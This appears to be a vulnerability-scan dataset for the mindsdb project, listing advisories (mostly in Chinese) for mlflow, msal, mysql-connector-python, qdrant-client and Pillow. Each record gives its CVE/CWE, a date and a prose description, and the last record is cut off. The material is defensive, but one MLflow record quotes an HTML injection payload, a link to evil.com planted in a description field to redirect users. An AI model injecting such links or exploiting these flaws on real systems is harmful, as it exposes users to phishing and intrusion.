mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理平台，允许用户轻松地构建和管理机器学习模型。该漏洞的根本原因在于 mlflow 在加载模型时使用了 Python 的原生 Unpickler，该组件对反序列化攻击存在脆弱性，允许恶意模型通过隐藏有效载荷来执行任意代码，包括操作系统命令。由于这一脆弱性，不仅在 mlflow.pyfunc.load_model 中存在，在 mlflow 的多个其他位置，如 mlflow.sklearn.load_model 和 mlflow.pytorch.pickle_module.py 中也有类似问题。</p>,2,1
mindsdb_mindsdb,mlflow,,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mindsdb_mindsdb,mlflow,,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mindsdb_mindsdb,mlflow,,True,,,,<p>MLflow 是一个开源的平台，旨在为机器学习项目提供管理和部署服务。该漏洞影响版本 2.5.0。由于在模型版本创建过程中未能正确处理输入参数，攻击者可以利用该漏洞向其他用户的账户注入恶意脚本。具体来说，攻击者在创建模型版本时，设置的运行链接（run_link）参数可以包含 JavaScript 代码。当受害者用户访问该链接时，恶意脚本将在其浏览器中执行，从而导致信息泄露或账户控制。</p>,2,1
mindsdb_mindsdb,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mindsdb_mindsdb,mlflow,,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mindsdb_mindsdb,msal,,True,,CWE-943,2023-09-18,"## Overview
[msal](https://pypi.org/project/msal) is a The Microsoft Authentication Library (MSAL) for Python library

Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Data Query Logic due to improper input sanitisation in `authcode.py` file.
## Remediation
Upgrade `msal` to version 1.24.1 or higher.
## References
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-python/commit/3427c2577bb674196a59e58cbf5aa91ad92cba7d)
",2,2
mindsdb_mindsdb,msal,,True,,CWE-943,2023-09-18,"## Overview
[msal](https://pypi.org/project/msal) is a The Microsoft Authentication Library (MSAL) for Python library

Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Data Query Logic due to improper input sanitisation in `authcode.py` file.
## Remediation
Upgrade `msal` to version 1.24.1 or higher.
## References
- [GitHub Commit](https://github.com/AzureAD/microsoft-authentication-library-for-python/commit/3427c2577bb674196a59e58cbf5aa91ad92cba7d)
",2,2
mindsdb_mindsdb,mysql-connector-python,9.1.0,True,CVE-2025-30714,CWE-284,2025-04-15,Oracle MySQL是美国甲骨文（Oracle）公司的一套开源关系数据库管理系统。在MySQL Connectors 9.0.0至9.2.0版本中，存在一个安全漏洞，攻击者可以利用多种网络访问协议实施攻击。该漏洞源于低权限攻击者的攻击，导致关键数据可能被未授权访问。成功攻击需要攻击者以外的其他人的人为交互。成功利用该漏洞可能导致对所有可访问MySQL Connectors数据的完全访问。此漏洞的CVSS 3.1基准得分为4.8（涉及机密性影响）。,3,0
mindsdb_mindsdb,qdrant-client,,True,CVE-2024-3829,CWE-59,,Qdrant 是一个开源的矢量相似性搜索引擎和矢量数据库。版本 1.9.0-dev 存在输入验证错误漏洞，攻击者可以通过操控快照文件来包括符号链接，从而在服务器上读取和写入任意文件。此漏洞的根本原因是快照恢复过程中的输入缺乏适当验证，允许攻击者利用符号链接对文件系统进行任意文件的读取和写入。利用该漏洞，攻击者可以获取机密数据或操纵系统文件，可能导致系统的完整性和安全性受到严重威胁。,1,1
mindsdb_mindsdb,pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
mindsdb_mindsdb,pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
mindsdb_mindsdb,pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
mindsdb_mindsdb,pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
mindsdb_mindsdb,pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
mindsdb_mindsdb,pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
mindsdb_mindsdb,pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
mindsdb_mindsdb,pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
mindsdb_mindsdb,pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
mindsdb_mindsdb,pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
mindsdb_mindsdb,pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
mindsdb_mindsdb,pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
mindsdb_mindsdb,pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
